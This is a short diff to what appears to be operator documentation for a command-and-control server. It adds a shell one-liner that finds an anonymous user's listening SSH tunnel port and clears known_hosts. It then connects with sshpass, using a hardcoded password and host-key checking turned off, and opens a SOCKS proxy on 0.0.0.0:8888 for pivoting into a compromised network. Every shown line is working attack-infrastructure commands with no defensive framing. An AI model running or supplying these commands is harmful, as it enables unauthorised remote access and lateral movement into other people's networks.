@@ -80,4 +80,6 @@ In the C2:
 sudo netstat -ptan | grep sshd | grep LISTEN | grep anon
 # Get the port number, replace the XXXXX 
 echo "" > ~/.ssh/known_hosts && sshpass -p pwd ssh user@localhost -p XXXXX -oStrictHostKeyChecking=no -D 0.0.0.0:8888
+# Extra: One-liner for two previous commands:
+echo "" > ~/.ssh/known_hosts && sshpass -p pwd ssh user@localhost -p `sudo netstat -ptan | grep sshd | grep LISTEN | grep anon | cut -d : -f2 | cut -d" " -f1` -oStrictHostKeyChecking=no -D 0.0.0.0:8888
 ```
